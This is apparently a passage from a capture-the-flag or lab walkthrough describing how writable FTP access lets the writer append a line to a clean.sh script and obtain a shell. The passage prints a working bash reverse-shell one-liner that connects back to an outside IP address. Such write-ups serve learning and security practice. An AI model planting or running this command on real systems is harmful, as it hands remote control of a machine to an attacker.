Exploitation of the network

After looking into the hint, It strikes me that we have full write permission on FTP and it is possible to upload our shell and get an access to the machine.

we have full write permission on clean.sh file.

So, we have append our shell script to the file

/bin/bash -c 'bash -i >& /dev/tcp/10.9.90.133/1234 0>&1'

And now we got our rev shell back.
